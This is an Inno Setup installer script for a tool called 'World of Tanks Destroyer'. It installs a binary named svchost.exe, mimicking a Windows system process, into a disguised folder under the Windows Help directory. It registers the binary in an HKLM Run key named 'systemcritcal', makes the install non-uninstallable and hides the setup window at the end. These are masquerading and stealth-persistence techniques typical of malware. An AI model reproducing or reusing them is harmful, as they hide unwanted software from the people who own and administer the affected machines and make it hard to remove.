[Setup]
AppId={{4707972A-629F-455E-A436-8DD56446271B}
AppName=World of Tanks Destroyer
AppVersion=1.1
AppPublisher=SaturnFX & marcel2012
AppPublisherURL=https://github.com/SaturnFX/WorldofTanksDestroyer
AppSupportURL=https://github.com/SaturnFX/WorldofTanksDestroyer
AppUpdatesURL=https://github.com/SaturnFX/WorldofTanksDestroyer
VersionInfoVersion = 1.1
VersionInfoCopyright = Copyright © SaturnFX 2010 - 2016
DefaultDirName={win}\Help\crsss
DisableDirPage=yes
DefaultGroupName=World of Tanks Destroyer
DisableProgramGroupPage=yes
Uninstallable=no
LicenseFile=LICENSE
OutputDir=Setup\Output
OutputBaseFilename=World of Tanks Destroyer Setup
SetupIconFile=Setup\Setup Icon.ico
WizardImageFile=Setup\WizardImage.bmp
WizardSmallImageFile=Setup\WizardSmallImage.bmp
Compression=lzma2/max
SolidCompression=yes

[Code]
procedure LoadSkin(lpszPath: String; lpszIniFileName: String);
external 'LoadSkin@files:isskin.dll stdcall';

procedure UnloadSkin();
external 'UnloadSkin@files:isskin.dll stdcall';

function ShowWindow(hWnd: Integer; uType: Integer): Integer;
external 'ShowWindow@user32.dll stdcall';

function InitializeSetup(): Boolean;
begin
	ExtractTemporaryFile('Office2007.cjstyles');
	LoadSkin(ExpandConstant('{tmp}\Office2007.cjstyles'), 'NormalBlack.ini');
	Result := True;
end;

procedure DeinitializeSetup();
begin
	ShowWindow(StrToInt(ExpandConstant('{wizardhwnd}')), 0);
	UnloadSkin();
end;

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: Autorun; Description: "Add application to autorun";  GroupDescription: "Autorun entry:"
                                                                                      
[Files]
Source: "C:\Program Files (x86)\Codejock Software\ISSkin\ISSkin.dll"; DestDir: {app}; Flags: dontcopy
Source: "C:\Program Files (x86)\Codejock Software\ISSkin\Styles\Office2007.cjstyles"; DestDir: {tmp}; Flags: dontcopy
Source: "C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\redist\x86\Microsoft.VC100.CRT\msvcp100.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\redist\x86\Microsoft.VC100.CRT\msvcr100.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "Setup\Binaries\svchost.exe"; DestDir: "{app}"; Flags: ignoreversion    
                                                                    
[Registry]
Root: HKLM; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "systemcritcal"; ValueData: "{app}\svchost.exe"; Tasks: Autorun

[Run]
Filename: "{app}\svchost.exe"; Description: "Run destroyer"; Flags: nowait postinstall runascurrentuser

